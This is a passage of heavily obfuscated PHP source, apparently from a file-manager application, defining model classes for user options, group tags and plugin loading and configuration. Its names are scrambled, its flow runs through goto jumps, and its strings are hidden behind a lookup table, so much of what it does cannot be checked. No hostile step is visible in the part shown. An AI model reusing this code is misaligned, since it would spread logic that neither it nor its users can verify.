$b÷Ë‹Ü·æ [$fà™ºŸöĞô[373]][$fà™ºŸöĞô[374]] = count($b÷Ë‹Ü·æ [$fà™ºŸöĞô[376]]); $b÷Ë‹Ü·æ [$fà™ºŸöĞô[373]][$fà™ºŸöĞô[375]] = ceil($b÷Ë‹Ü·æ [$fà™ºŸöĞô[373]][$fà™ºŸöĞô[374]] / $b÷Ë‹Ü·æ [$fà™ºŸöĞô[373]][$fà™ºŸöĞô[370]]); } $this->_listDataApply($b÷Ë‹Ü·æ [$fà™ºŸöĞô[376]]); goto FØÚ¢ìÕßÑ; Céìì÷”Õ: } private function _filterByGroup(&$cÈë™¥­®˜, $E×¤Š½ÚÓŞ) { $b¨ÙÄ¼‡©ô =& $_SERVER[£¶ä½¶¢]; if (!$E×¤Š½ÚÓŞ) { return $cÈë™¥­®˜; } foreach ($cÈë™¥­®˜[$b¨ÙÄ¼‡©ô[376]] as $D‡ë„ÃÒ«Š => &$c÷ÅÙö„õŞ) { $Eƒ—ñõˆ = array_to_keyvalue($c÷ÅÙö„õŞ[$b¨ÙÄ¼‡©ô[1864]], $b¨ÙÄ¼‡©ô[43], $b¨ÙÄ¼‡©ô[1690]); if (!in_array($E×¤Š½ÚÓŞ, $Eƒ—ñõˆ)) { unset($cÈë™¥­®˜[$b¨ÙÄ¼‡©ô[376]][$D‡ë„ÃÒ«Š]); } } unset($c÷ÅÙö„õŞ); $cÈë™¥­®˜[$b¨ÙÄ¼‡©ô[376]] = array_values($cÈë™¥­®˜[$b¨ÙÄ¼‡©ô[376]]); $cÈë™¥­®˜[$b¨ÙÄ¼‡©ô[373]] = array($b¨ÙÄ¼‡©ô[1926] => count($cÈë™¥­®˜[$b¨ÙÄ¼‡©ô[376]]), $b¨ÙÄ¼‡©ô[1924] => $cÈë™¥­®˜[$b¨ÙÄ¼‡©ô[373]][$b¨ÙÄ¼‡©ô[370]], $b¨ÙÄ¼‡©ô[1923] => 1, $b¨ÙÄ¼‡©ô[1925] => 1); } private function _searchFromMeta($CªÀ‹…ìß‘, $A•ƒèìöî¢, $DŠØ«°”ˆ) { goto d˜Ÿ°§ˆÊÂ; d­öÚ¨ºÏÆ: $DÃ…¯†Ø¢ = $this->parseWhereLike($DÃ…¯†Ø¢); $dˆ×¯¤î  = Model($AÀê ¥¨¨‘[2156])->where($DÃ…¯†Ø¢)->limit($DŠØ«°”ˆ)->select(); if (!$dˆ×¯¤î ) { return array(); } goto b’Åæ‹éÁÜ; BİƒËÕñŠ›: return $FŠÑ‚ì‰Ê™; goto fùãŒ×ô¶; b’Åæ‹éÁÜ: $dˆ×¯¤î  = array_to_keyvalue($dˆ×¯¤î , $AÀê ¥¨¨‘[43], $AÀê ¥¨¨‘[1526]); $FŠÑ‚ì‰Ê™ = $this->where(array($AÀê ¥¨¨‘[1518] => array($AÀê ¥¨¨‘[17], $dˆ×¯¤î )))->select(); if (!$FŠÑ‚ì‰Ê™) { return array(); } goto BİƒËÕñŠ›; d˜Ÿ°§ˆÊÂ: $AÀê ¥¨¨‘ =& $_SERVER[£¶ä½¶¢]; $A•ƒèìöî¢ = strtolower($A•ƒèìöî¢); $DÃ…¯†Ø¢ = array($AÀê ¥¨¨‘[103] => $CªÀ‹…ìß‘, $AÀê ¥¨¨‘[381] => array($AÀê ¥¨¨‘[388], "\45{$A•ƒèìöî¢}\x25")); goto d­öÚ¨ºÏÆ; fùãŒ×ô¶: } private function _listDataApplyItem($BŸˆÀÚŞŒ±) { $aÅÈÔ¯øğ = array($BŸˆÀÚŞŒ±); $this->_listDataApply($aÅÈÔ¯øğ); return $aÅÈÔ¯øğ[0]; } private function _listDataApply(&$EñÖÁ„Å¿¶) { goto AÛ®ß‹éÙÄ; FñäùÀ–´ˆ: $this->_listAppendSourceRoot($EñÖÁ„Å¿¶, $A¿Âß‰„†); goto e­Øé¾²; AÛ®ß‹éÙÄ: $cÄ±…È¶¼ =& $_SERVER[£¶ä½¶¢]; if (!$EñÖÁ„Å¿¶) { return; } array_remove_key($EñÖÁ„Å¿¶, $cÄ±…È¶¼[847]); goto a±³Æà½; a±³Æà½: $A¿Âß‰„† = array_to_keyvalue($EñÖÁ„Å¿¶, $cÄ±…È¶¼[43], $cÄ±…È¶¼[1526]); $this->_listAppendGroup($EñÖÁ„Å¿¶, $A¿Âß‰„†); $this->_listAppendMeta($EñÖÁ„Å¿¶, $A¿Âß‰„†); goto FñäùÀ–´ˆ; e­Øé¾²: } private function _listAppendSourceRoot(&$BÑ¬Ò›Ñ”, $cƒÛƒº) { goto Aè«ù‰Ü×ô; BæŞ˜´åâİ: $a¸×äò…ô¬ = Model($f‹—‹œÁã[798])->order($f‹—‹œÁã[1784])->field($A”ÑÂ­òÃœ)->where($d”‚¥§Û®é)->select(); $a¸×äò…ô¬ = array_to_keyvalue($a¸×äò…ô¬, $f‹—‹œÁã[492]); $a¸×äò…ô¬ = array_remove_key($a¸×äò…ô¬, $f‹—‹œÁã[492]); goto A¡øËİêˆ; A¡øËİêˆ: foreach ($BÑ¬Ò›Ñ” as &$DªŒ©Şš¥ˆ) { $DªŒ©Şš¥ˆ[$f‹—‹œÁã[95]] = $a¸×äò…ô¬[$DªŒ©Şš¥ˆ[$f‹—‹œÁã[1526]]] ? $a¸×äò…ô¬[$DªŒ©Şš¥ˆ[$f‹—‹œÁã[1526]]] : array(); } unset($DªŒ©Şš¥ˆ); goto BÀ×Á¸•Ğ¸; Aè«ù‰Ü×ô: $f‹—‹œÁã =& $_SERVER[£¶ä½¶¢]; $d”‚¥§Û®é = array($f‹—‹œÁã[486] => 0, $f‹—‹œÁã[412] => SourceModel::TYPE_USER, $f‹—‹œÁã[492] => array($f‹—‹œÁã[17], $cƒÛƒº)); $A”ÑÂ­òÃœ = $f‹—‹œÁã[1783]; goto BæŞ˜´åâİ; BÀ×Á¸•Ğ¸: } private function _listAppendGroup(&$B´¨’³‚Ï†, $d‚’ïÍ‰³) { goto A¸†‡Òéñ; dÑù©¬¸‡Ò: foreach ($B´¨’³‚Ï† as &$EŒ§Ç›¥„Œ) { $EŒ§Ç›¥„Œ[$e³Ÿ·‹Öäß[1864]] = array(); if (isset($A„ªùàØÔº[$EŒ§Ç›¥„Œ[$e³Ÿ·‹Öäß[1526]]])) { $EŒ§Ç›¥„Œ[$e³Ÿ·‹Öäß[1864]] = $A„ªùàØÔº[$EŒ§Ç›¥„Œ[$e³Ÿ·‹Öäß[1526]]]; } } unset($EŒ§Ç›¥„Œ); goto cåôî§¦Ã¸; B··»¥¶æ: $A„ªùàØÔº = array_to_keyvalue_group($A„ªùàØÔº, $e³Ÿ·‹Öäß[1526]); foreach ($A„ªùàØÔº as &$A˜È‘ä×Í) { $B‘ÜØÏ­Öˆ = array(); foreach ($A˜È‘ä×Í as $c–“„ãğ) { if (!$c–“„ãğ[$e³Ÿ·‹Öäß[1785]]) { continue; } $a•µ’ğÕä¶ = Model($e³Ÿ·‹Öäß[1857])->listData($c–“„ãğ[$e³Ÿ·‹Öäß[1785]]); $B‘ÜØÏ­Öˆ[] = array($e³Ÿ·‹Öäß[1690] => $c–“„ãğ[$e³Ÿ·‹Öäß[1690]], $e³Ÿ·‹Öäß[2158] => $E¢ïùÙœ[$c–“„ãğ[$e³Ÿ·‹Öäß[1690]]][$e³Ÿ·‹Öäß[38]], $e³Ÿ·‹Öäß[495] => $E¢ïùÙœ[$c–“„ãğ[$e³Ÿ·‹Öäß[1690]]][$e³Ÿ·‹Öäß[495]], $e³Ÿ·‹Öäß[414] => $a•µ’ğÕä¶); } $A˜È‘ä×Í = $B‘ÜØÏ­Öˆ; } unset($A˜È‘ä×Í); goto dÑù©¬¸‡Ò; eÍ·ŞæÃÔÁ: $e´Ö—Æ¨Ù‡ = array($e³Ÿ·‹Öäß[1690] => array($e³Ÿ·‹Öäß[17], $c¯°ÈÏâ†¾)); $E¢ïùÙœ = Model($e³Ÿ·‹Öäß[1862])->field($e³Ÿ·‹Öäß[2157])->where($e´Ö—Æ¨Ù‡)->select(); $E¢ïùÙœ = array_to_keyvalue($E¢ïùÙœ, $e³Ÿ·‹Öäß[1690]); goto B··»¥¶æ; A¸†‡Òéñ: $e³Ÿ·‹Öäß =& $_SERVER[£¶ä½¶¢]; $e´Ö—Æ¨Ù‡ = array($e³Ÿ·‹Öäß[1526] => array($e³Ÿ·‹Öäß[17], $d‚’ïÍ‰³)); $A„ªùàØÔº = Model($e³Ÿ·‹Öäß[1771])->where($e´Ö—Æ¨Ù‡)->select(); goto bŒ±ç®•ôê; bŒ±ç®•ôê: $c¯°ÈÏâ†¾ = array_to_keyvalue($A„ªùàØÔº, $e³Ÿ·‹Öäß[43], $e³Ÿ·‹Öäß[1690]); $c¯°ÈÏâ†¾ = array_remove_value(array_unique($c¯°ÈÏâ†¾), $e³Ÿ·‹Öäß[201]); if (!$c¯°ÈÏâ†¾ || !$A„ªùàØÔº) { return; } goto eÍ·ŞæÃÔÁ; cåôî§¦Ã¸: } private function _listAppendMeta(&$Aê¥İà¢½“, $E—‡æÛ¸¦¿) { goto B¶½’è–ö; Dää—“½Üæ: foreach ($Aê¥İà¢½“ as &$c»©î¡¡¬¼) { $FĞÙ¯¶Š¸ğ = array(); if (isset($B·³ï»à…[$c»©î¡¡¬¼[$d¼°ëãëô¯[1526]]])) { $FĞÙ¯¶Š¸ğ = $B·³ï»à…[$c»©î¡¡¬¼[$d¼°ëãëô¯[1526]]]; } $c»©î¡¡¬¼[$d¼°ëãëô¯[2160]] = array(); if (isset($FĞÙ¯¶Š¸ğ[$fæÇ¬¶«îÑ])) { $c»©î¡¡¬¼[$d¼°ëãëô¯[2160]] = $A—çÂÌÒµ->getUserJobInfo($FĞÙ¯¶Š¸ğ[$fæÇ¬¶«îÑ]); } } unset($c»©î¡¡¬¼); goto D—‹Ë‚Ò‹Ä; aÜô‚¨¹: foreach ($B·³ï»à… as &$FÈß¹Æ’ ) { $E¦›Û£¸¶ = array(); foreach ($FÈß¹Æ’  as $D·Ñ–Øœ£º) { if (!in_array($D·Ñ–Øœ£º[$d¼°ëãëô¯[103]], $e£‘“ÔÀ”¤)) { $E¦›Û£¸¶[$D·Ñ–Øœ£º[$d¼°ëãëô¯[103]]] = $D·Ñ–Øœ£º[$d¼°ëãëô¯[381]]; } } $FÈß¹Æ’  = $E¦›Û£¸¶; } unset($FÈß¹Æ’ ); $A—çÂÌÒµ = Model($d¼°ëãëô¯[2159]); goto Dää—“½Üæ; CÏó›ç¥áö: $BØàÁŞ¯Ú = array($d¼°ëãëô¯[1526] => array($d¼°ëãëô¯[17], $E—‡æÛ¸¦¿)); $B·³ï»à… = Model($d¼°ëãëô¯[2135])->where($BØàÁŞ¯Ú)->select(); $B·³ï»à… = array_to_keyvalue_group($B·³ï»à…, $d¼°ëãëô¯[1526]); goto aÜô‚¨¹; B¶½’è–ö: $d¼°ëãëô¯ =& $_SERVER[£¶ä½¶¢]; $fæÇ¬¶«îÑ = UserJobModel::JOB_KEY; $e£‘“ÔÀ”¤ = array($d¼°ëãëô¯[2137]); goto CÏó›ç¥áö; D—‹Ë‚Ò‹Ä: } protected function groupUserAll($AÈ‡ˆ˜éºØ) { $F°«™ãø¾ø =& $_SERVER[£¶ä½¶¢]; if (!$AÈ‡ˆ˜éºØ) { return !1; } $A”òÓÊ«å = Model($F°«™ãø¾ø[1771])->field($F°«™ãø¾ø[1526])->where(array($F°«™ãø¾ø[1690] => array($F°«™ãø¾ø[17], $AÈ‡ˆ˜éºØ)))->select(); $A”òÓÊ«å = array_to_keyvalue($A”òÓÊ«å, $F°«™ãø¾ø[43], $F°«™ãø¾ø[1526]); return array_unique($A”òÓÊ«å); } public function userSearch($eò¾µ“ŸÅµ, $dËÚâÛğ = "\x2a") { return Model($_SERVER[£¶ä½¶¢][514])->where($eò¾µ“ŸÅµ)->field($dËÚâÛğ)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\x65\x72\x5f\157\x70\164\x69\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($fš…öèÁ) { $cšô¾ƒßù =& $_SERVER[£¶ä½¶¢]; if (!defined($cšô¾ƒßù[462])) { define($cšô¾ƒßù[462], 0); } return "\x55\x73\x65\162\117\x70\164\151\157\x6e\137{$fš…öèÁ}\137" . USER_ID; } protected function filterWhere($CñùÚ¿‚á) { $eäå‚¥ñ½ğ =& $_SERVER[£¶ä½¶¢]; if (!defined($eäå‚¥ñ½ğ[462])) { define($eäå‚¥ñ½ğ[462], 0); } $CñùÚ¿‚á[$eäå‚¥ñ½ğ[1526]] = USER_ID; return $CñùÚ¿‚á; } public function cacheRemoveUser($fÊ„½”®Ù, $E‰±ìŒã‘º) { return Cache::remove("\x55\163\x65\162\117\160\164\151\x6f\156\x5f{$fÊ„½”®Ù}\x5f" . $E‰±ìŒã‘º); } protected function optionDefault($e©íÍ‚¨–Ï = '') { $fŒÌ”‰©•  =& $_SERVER[£¶ä½¶¢]; if ($e©íÍ‚¨–Ï == $fŒÌ”‰©• [43]) { return $GLOBALS[$fŒÌ”‰©• [16]][$fŒÌ”‰©• [2161]]; } if ($e©íÍ‚¨–Ï == $fŒÌ”‰©• [2162]) { return $GLOBALS[$fŒÌ”‰©• [16]][$fŒÌ”‰©• [2163]]; } } } goto a×¢õ­Û£; BÌ­½àÈ°‚: class GroupTagModel extends ModelBase { protected $tableName = "\x75\163\x65\162\x5f\146\141\x76"; protected function cacheFunctionAlias($d³¸‹—®¹†) { $e‘ÜÂ”·îâ =& $_SERVER[£¶ä½¶¢]; return array($e‘ÜÂ”·îâ[1790] => array($d³¸‹—®¹†[0], $e‘ÜÂ”·îâ[1791]), $e‘ÜÂ”·îâ[1792] => array($d³¸‹—®¹†[0], $e‘ÜÂ”·îâ[1793])); } protected function get($b‡¤ñ´ö»¢) { $c¥çµ†–ğ¤ =& $_SERVER[£¶ä½¶¢]; $A®Âª¼ö°Ì = Model($c¥çµ†–ğ¤[494])->metaGet($b‡¤ñ´ö»¢, $c¥çµ†–ğ¤[1794]); $fÈšÅì†² = json_decode($A®Âª¼ö°Ì, !0); return $fÈšÅì†² ? $fÈšÅì†² : array($c¥çµ†–ğ¤[1795] => $c¥çµ†–ğ¤[97], $c¥çµ†–ğ¤[376] => array()); } protected function set($b‘â×ŸÒ•ƒ, $d£ƒÆÉ”•©) { $a‡§ï½‹µŠ =& $_SERVER[£¶ä½¶¢]; $d£ƒÆÉ”•© = $d£ƒÆÉ”•© ? $d£ƒÆÉ”•© : array($a‡§ï½‹µŠ[1795] => $a‡§ï½‹µŠ[97], $a‡§ï½‹µŠ[376] => array()); Model($a‡§ï½‹µŠ[494])->metaSet($b‘â×ŸÒ•ƒ, $a‡§ï½‹µŠ[1794], json_encode($d£ƒÆÉ”•©)); return Model($a‡§ï½‹µŠ[494])->metaSet($b‘â×ŸÒ•ƒ, $a‡§ï½‹µŠ[1794], json_encode($d£ƒÆÉ”•©)); } protected function getByTagID($AÍ°Û‚ƒâï, $Fá‡‹‡×–³) { goto Bçàßßí­¶; EÛŞÀŒò: return is_array($A£÷â½‚¿®) ? $A£÷â½‚¿® : !1; goto CÈ½¹İøŠ; Bçàßßí­¶: $DÌ¤‚æÜà =& $_SERVER[£¶ä½¶¢]; if (!$AÍ°Û‚ƒâï || !$Fá‡‹‡×–³) { return !1; } if (!Model($DÌ¤‚æÜà[494])->getInfoSimple($AÍ°Û‚ƒâï)) { return !1; } goto F™êÕÃï‡; F™êÕÃï‡: $C¯Ëé×¬òÁ = $this->get($AÍ°Û‚ƒâï); if (!$C¯Ëé×¬òÁ || !isset($C¯Ëé×¬òÁ[$DÌ¤‚æÜà[376]])) { return !1; } $A£÷â½‚¿® = array_find_by_field($C¯Ëé×¬òÁ[$DÌ¤‚æÜà[376]], $DÌ¤‚æÜà[401], $Fá‡‹‡×–³); goto EÛŞÀŒò; CÈ½¹İøŠ: } public function listSource($b±±Ã¶–Ó, $cğâµê±×š) { goto F„¼è„ëÏ‰; cíÖ‚ª„Ğˆ: foreach ($EÀºİ°Èëà as $CÙÓ—Óšƒ„ => $bİÌÜÂ²Š×) { $eºÉÔ³‡²µ = !0; if (!$cğâµê±×š) { $D ëÛƒÔÚ‘[] = $CÙÓ—Óšƒ„; continue; } foreach ($cğâµê±×š as $DÆ¸¿“ôö) { if (!in_array($DÆ¸¿“ôö, $bİÌÜÂ²Š×)) { $eºÉÔ³‡²µ = !1; break; } } if ($eºÉÔ³‡²µ) { $D ëÛƒÔÚ‘[] = $CÙÓ—Óšƒ„; } } if (!$D ëÛƒÔÚ‘) { return array(); } $cå½¢­Îğ = array($câ½²†­íº[418] => array($câ½²†­íº[419], $D ëÛƒÔÚ‘), $câ½²†­íº[492] => $b±±Ã¶–Ó, $câ½²†­íº[412] => SourceModel::TYPE_GROUP); goto fßƒ¢ÏšŒé; F„¼è„ëÏ‰: $câ½²†­íº =& $_SERVER[£¶ä½¶¢]; if ($cğâµê±×š && !is_array($cğâµê±×š)) { $cğâµê±×š = array($cğâµê±×š); } $A„ÃÕğŞäÂ = $this->listData($b±±Ã¶–Ó); goto dóçÀ‚Œè; fßƒ¢ÏšŒé: $A—°“ç¾æ = Model($câ½²†­íº[1203])->listSource($cå½¢­Îğ); if (!$A—°“ç¾æ || count($D ëÛƒÔÚ‘) == $A—°“ç¾æ[$câ½²†­íº[373]][$câ½²†­íº[374]]) { return $A—°“ç¾æ; } $BƒçËö›°‡ = array(); goto eÚÂ±Á‚Ò­; ağÃ›ÁëÖƒ: foreach ($D ëÛƒÔÚ‘ as $EÕİ†¨ç) { if (!in_array($EÕİ†¨ç, $Dƒ”¸Œ·­³)) { $BƒçËö›°‡[] = $EÕİ†¨ç; } } if ($BƒçËö›°‡) { $this->removeBySource($b±±Ã¶–Ó, $BƒçËö›°‡); } return $A—°“ç¾æ; goto Cø³ÅªÇ; eÚÂ±Á‚Ò­: $BĞæº—–Ÿ = array_to_keyvalue($A—°“ç¾æ[$câ½²†­íº[85]], $câ½²†­íº[43], $câ½²†­íº[403]); $Cµ¤†¸²ç« = array_to_keyvalue($A—°“ç¾æ[$câ½²†­íº[84]], $câ½²†­íº[43], $câ½²†­íº[403]); $Dƒ”¸Œ·­³ = array_merge($Cµ¤†¸²ç«, $BĞæº—–Ÿ); goto ağÃ›ÁëÖƒ; dóçÀ‚Œè: $EÀºİ°Èëà = array(); foreach ($A„ÃÕğŞäÂ as $d‡å¡İËø°) { $EÕİ†¨ç = $d‡å¡İËø°[$câ½²†­íº[86]]; if (!$EÕİ†¨ç) { continue; } if (!isset($EÀºİ°Èëà[$EÕİ†¨ç])) { $EÀºİ°Èëà[$EÕİ†¨ç] = array(); } $EÀºİ°Èëà[$EÕİ†¨ç][] = $d‡å¡İËø°[$câ½²†­íº[427]]; } $D ëÛƒÔÚ‘ = array(); goto cíÖ‚ª„Ğˆ; Cø³ÅªÇ: } protected function listData($fÖ¹”¾©ˆï) { $BÀ–š…¤ùß =& $_SERVER[£¶ä½¶¢]; $f¿¿ÜïÅöÆ = array($BÀ–š…¤ùß[1518] => 0, $BÀ–š…¤ùß[471] => array($BÀ–š…¤ùß[1796], 0), $BÀ–š…¤ùß[423] => $BÀ–š…¤ùß[1797] . $fÖ¹”¾©ˆï); $c²ßï§“ÌĞ = $BÀ–š…¤ùß[1798]; $FÅÍ½ŠßÆÆ = $this->field($c²ßï§“ÌĞ)->where($f¿¿ÜïÅöÆ)->order($BÀ–š…¤ùß[1799])->select(); return $FÅÍ½ŠßÆÆ ? $FÅÍ½ŠßÆÆ : array(); } protected function addToTag($aÀŠ±Ú¨¸ó, $bÀ™¾ Æ‘, $aéáÀâ†òÃ) { $böàæôò˜À =& $_SERVER[£¶ä½¶¢]; if (!$this->getByTagID($aÀŠ±Ú¨¸ó, $aéáÀâ†òÃ) || !$bÀ™¾ Æ‘) { return !1; } if (!Model($böàæôò˜À[798])->pathInfo($bÀ™¾ Æ‘)) { return !1; } $BåÅ½ÜİÓÉ = array($böàæôò˜À[1518] => 0, $böàæôò˜À[471] => $aéáÀâ†òÃ, $böàæôò˜À[422] => $bÀ™¾ Æ‘, $böàæôò˜À[423] => $böàæôò˜À[1800] . $aÀŠ±Ú¨¸ó, $böàæôò˜À[421] => $böàæôò˜À[43], $böàæôò˜À[1694] => 0); if ($this->where($BåÅ½ÜİÓÉ)->find()) { return !1; } return $this->add($BåÅ½ÜİÓÉ); } protected function removeFromTag($d©‚»æŸ‹œ, $bÎù‚Ä¬ô, $aÂœ»À±å) { $f‡‚ÊøöÁÕ =& $_SERVER[£¶ä½¶¢]; if (!$this->getByTagID($d©‚»æŸ‹œ, $aÂœ»À±å) || !$bÎù‚Ä¬ô) { return !1; } if (is_array($bÎù‚Ä¬ô)) { $bÎù‚Ä¬ô = array($f‡‚ÊøöÁÕ[17], $bÎù‚Ä¬ô); } $e—˜»»… = array($f‡‚ÊøöÁÕ[1518] => 0, $f‡‚ÊøöÁÕ[471] => $aÂœ»À±å, $f‡‚ÊøöÁÕ[423] => $f‡‚ÊøöÁÕ[1800] . $d©‚»æŸ‹œ, $f‡‚ÊøöÁÕ[422] => $bÎù‚Ä¬ô); return $this->where($e—˜»»…)->delete(); } protected function removeByTag($a‚‰µßÁ÷, $B‡œÄ°„È‚) { $bŠ«ô„ª­ö =& $_SERVER[£¶ä½¶¢]; if (!$this->getByTagID($a‚‰µßÁ÷, $B‡œÄ°„È‚)) { return !1; } $e×ˆ Şìç® = array($bŠ«ô„ª­ö[1518] => 0, $bŠ«ô„ª­ö[471] => $B‡œÄ°„È‚, $bŠ«ô„ª­ö[423] => $bŠ«ô„ª­ö[1800] . $a‚‰µßÁ÷); return $this->where($e×ˆ Şìç®)->delete(); } protected function removeBySource($dªöêÄ¥‡‚, $FÏ†Îìó´È) { $Fİ ìµåËª =& $_SERVER[£¶ä½¶¢]; if (!$dªöêÄ¥‡‚ || !$FÏ†Îìó´È) { return !1; } if (is_array($FÏ†Îìó´È)) { $FÏ†Îìó´È = array($Fİ ìµåËª[17], $FÏ†Îìó´È); } $BğÌ¨ÇñÙÃ = array($Fİ ìµåËª[1518] => 0, $Fİ ìµåËª[422] => $FÏ†Îìó´È, $Fİ ìµåËª[471] => array($Fİ ìµåËª[969], 0), $Fİ ìµåËª[423] => $Fİ ìµåËª[1800] . $dªöêÄ¥‡‚); return $this->where($BğÌ¨ÇñÙÃ)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\155\x2e\160\154\x75\x67\151\156\x4c\151\x73\164"; public $field = array("\156\x61\x6d\x65", "\x73\164\141\x74\x75\x73", "\x72\x65\147\151\145\x73\x74", "\x63\157\x6e\x66\x69\147"); public function loadList($BŠìˆ„øÁˆ = false) { $cßĞ§¢‹Ëä = array_to_keyvalue($this->listData(), $_SERVER[£¶ä½¶¢][38]); if ($BŠìˆ„øÁˆ) { return $cßĞ§¢‹Ëä[$BŠìˆ„øÁˆ]; } return $cßĞ§¢‹Ëä; } public function init() { $D˜ì¿µõ¼Ã =& $_SERVER[£¶ä½¶¢]; Hook::trigger($D˜ì¿µõ¼Ã[1801]); $fğÍÁÆ = $this->loadPluginList(); foreach ($fğÍÁÆ as $BÁ’Òæõä¥ => $fğ£ìƒ’ø) { $e“µ†Şí‹Ò = $this->appAllow($BÁ’Òæõä¥, $fğ£ìƒ’ø); if (!$e“µ†Şí‹Ò) { continue; } foreach ($fğ£ìƒ’ø[$D˜ì¿µõ¼Ã[1802]] as $AİäÁœ¹”ä => $EœÅÃâîø) { Hook::bind($AİäÁœ¹”ä, $EœÅÃâîø); } } Hook::trigger($D˜ì¿µõ¼Ã[1803]); Hook::trigger(ACTION); } public function appAllow($CÊ†‰•å¿, $B‘¥ãååæ§, $dªŠ÷Åí» = true) { $dÄœÓù¢ëÈ =& $_SERVER[£¶ä½¶¢]; $C¡Îá‹öá = PLUGIN_DIR . $CÊ†‰•å¿ . $dÄœÓù¢ëÈ[1804]; if (!is_array($B‘¥ãååæ§) || !is_array($B‘¥ãååæ§[$dÄœÓù¢ëÈ[1802]]) || $B‘¥ãååæ§[$dÄœÓù¢ëÈ[718]] != 1 || !is_file($C¡Îá‹öá)) { return !1; } if ($GLOBALS[$dÄœÓù¢ëÈ[493]] == 1) { return !0; } if ($dªŠ÷Åí» && !Action($dÄœÓù¢ëÈ[1805])->checkAuth($CÊ†‰•å¿)) { return !1; } return !0; } public function unInstall($aš„ˆ Ãùª) { $F­İÒ¯¶¨À =& $_SERVER[£¶ä½¶¢]; $eŠ¹—×»ÅÜ = $this->loadList($aš„ˆ Ãùª); if (file_exists(PLUGIN_DIR . $aš„ˆ Ãùª)) { Hook::apply($aš„ˆ Ãùª . $F­İÒ¯¶¨À[1806]); } $this->remove($eŠ¹—×»ÅÜ[$F­İÒ¯¶¨À[401]]); } public function changeStatus($eÈ•‚‰ë–˜, $C‰ö•®Ù–ø) { $C–ØäÈåä =& $_SERVER[£¶ä½¶¢]; $A¢ÛËÅÅÑÇ = $this->loadList($eÈ•‚‰ë–˜); if ($C‰ö•®Ù–ø) { Hook::apply($eÈ•‚‰ë–˜ . $C–ØäÈåä[1807]); } $this->update($A¢ÛËÅÅÑÇ[$C–ØäÈåä[401]], array($C–ØäÈåä[1808] => $C‰ö•®Ù–ø)); } public function appRegist($C›…§àŒˆÇ, $fØï‘¬™Ì) { $dªÈãÉñ =& $_SERVER[£¶ä½¶¢]; $b¿îóÀâ°» = $this->loadList($C›…§àŒˆÇ); if ($b¿îóÀâ°») { $this->update($b¿îóÀâ°»[$dªÈãÉñ[401]], array($dªÈãÉñ[1802] => $fØï‘¬™Ì)); } else { $E¹ñÂÂÒÍÓ = array($dªÈãÉñ[38] => $C›…§àŒˆÇ, $dªÈãÉñ[1802] => $fØï‘¬™Ì, $dªÈãÉñ[718] => 0, $dªÈãÉñ[16] => $this->getConfigDefault($C›…§àŒˆÇ)); $this->insert($E¹ñÂÂÒÍÓ); } } public function getConfigDefault($C®Ôµ•¸¸) { $EÑºÇ”ËÆ =& $_SERVER[£¶ä½¶¢]; $DÜŒÊ†®¹Ú = array(); $Då¡ŒÄâË = $this->getPackageJson($C®Ôµ•¸¸); if (!$Då¡ŒÄâË && is_array($Då¡ŒÄâË[$EÑºÇ”ËÆ[1809]])) { return $DÜŒÊ†®¹Ú; } foreach ($Då¡ŒÄâË[$EÑºÇ”ËÆ[1809]] as $aíŸùÇôè => $bæ’ÉêÉÉŠ) { if (!isset($bæ’ÉêÉÉŠ[$EÑºÇ”ËÆ[381]]) || isset($DÜŒÊ†®¹Ú[$aíŸùÇôè])) { continue; } $DÜŒÊ†®¹Ú[$aíŸùÇôè] = $bæ’ÉêÉÉŠ[$EÑºÇ”ËÆ[381]]; } return $DÜŒÊ†®¹Ú; } public function getPackageJson($D¤Íî¤È§Ê) { return Hook::apply($D¤Íî¤È§Ê . $_SERVER[£¶ä½¶¢][1810]); } public function getConfig($B¥áŸ ‚à, $bƒª×çä±Ù = false) { $f¾ À¥¤›Ö =& $_SERVER[£¶ä½¶¢]; $aØîÛ¦°µÁ = array(); $Aë¤öÅøë = $this->loadList($B¥áŸ ‚à); if ($Aë¤öÅøë && is_array($Aë¤öÅøë[$f¾ À¥¤›Ö[16]])) { $aØîÛ¦°µÁ = $Aë¤öÅøë[$f¾ À¥¤›Ö[16]]; } if (!$aØîÛ¦°µÁ || $bƒª×çä±Ù) { $aØîÛ¦°µÁ = $this->getConfigDefault($B¥áŸ ‚à); } return $aØîÛ¦°µÁ; } public function setConfig($cÑË…èŒ™¥, $C´¡¬ä¾‹· = false) { goto d…«ÃîÍ; EôÑÉÂôÒÅ: $Eö¦–¦á¹í = $BÅ³Á‡à¼[$b…š º¢Æ¦[16]]; if ($C´¡¬ä¾‹· == !1) { $Eö¦–¦á¹í = array(); $C´¡¬ä¾‹· = $this->getConfigDefault($cÑË…èŒ™¥); } foreach ($C´¡¬ä¾‹· as $A‹éôÎÇæé => $a†´¯—÷Å) { $Eö¦–¦á¹í[$A‹éôÎÇæé] = is_string($a†´¯—÷Å) ? trim($a†´¯—÷Å) : $a†´¯—÷Å; } goto Aøâ¢™¾À; Aøâ¢™¾À: $this->update($BÅ³Á‡à¼[$b…š º¢Æ¦[401]], array($b…š º¢Æ¦[16] => $Eö¦–¦á¹í)); goto CÌï°¡ˆĞ; d…«ÃîÍ: $b…š º¢Æ¦ =& $_SERVER[£¶ä½¶¢]; $BÅ³Á‡à¼ = $this->loadList($cÑË…èŒ™¥); if (!$BÅ³Á‡à¼) { return !1; } goto EôÑÉÂôÒÅ; CÌï°¡ˆĞ: } public function viewList() { goto B©æ’ä¯§; a¤ÇÆ¤¤Œ: $a‘¡ÛÎÅè = $this->loadPluginList(); $f‚××Ï±ë = array(); foreach ($a‘¡ÛÎÅè as $E±™¡˜²ª => $C±®«Ğ) { unset($C±®«Ğ[$Eƒ†ãì×›„[1802]], $C±®«Ğ[$Eƒ†ãì×›„[16]]); $f‰İšÄ‡Ñ” = PLUGIN_DIR . $C±®«Ğ[$Eƒ†ãì×›„[38]] . $Eƒ†ãì×›„[1804]; if (!is_file($f‰İšÄ‡Ñ”)) { continue; } $bÏÂó­‚Ö• = Hook::apply($C±®«Ğ[$Eƒ†ãì×›„[38]] . $Eƒ†ãì×›„[1810]); if (is_array($bÏÂó­‚Ö•)) { $f‚××Ï±ë[$E±™¡˜²ª] = array_merge($C±®«Ğ, $bÏÂó­‚Ö•); } } goto B¬áªØ¡§í; B¬áªØ¡§í: return $f‚××Ï±ë; goto DŠ¥›ÄÓ–; B©æ’ä¯§: $Eƒ†ãì×›„ =& $_SERVER[£¶ä½¶¢]; $a‘¡ÛÎÅè = $this->loadList(); 